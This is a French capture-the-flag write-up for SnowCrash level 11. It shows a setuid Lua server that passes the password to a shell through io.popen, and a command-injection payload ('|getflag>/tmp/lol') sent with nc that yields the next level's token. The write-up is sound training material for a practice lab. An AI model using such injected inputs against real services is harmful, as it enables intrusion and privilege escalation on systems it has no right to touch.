# 11 - Lua exploit: user input

- On se connecte en tant que level11.
```
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```


- Un script lua nous a été laissé:
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```


- Se script définit un serveur TCP écoutant sur 127.0.0.1 à travers le port 5151. Il demande aux clients tentant de se connecter un mot de passe, qui est ensuite passé à une fonction de hashage. Le résultat du hash est comparé, et le serveur répond en conséquence.
```
level12@SnowCrash:~$ netstat -tunlp | grep 5151
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
```

- Il y a bien un serveur écoutant sur 127.0.0.1 à travers le port 5151.
- Ce qui nous intéresse ici est la fonction de hashage. Cette fonction exécute `echo "..pass.." | sha1sum`, (`pass` étant le mot de passe donné au serveur), du coup:
```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password:|getflag>/tmp/lol
Erf nope..
```

```
level11@SnowCrash:~$ cat /tmp/lol
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

```
level11@SnowCrash:~$ su level12
Password:fa6v5ateaw21peobuub8ipe6s
level12@SnowCrash:~$
```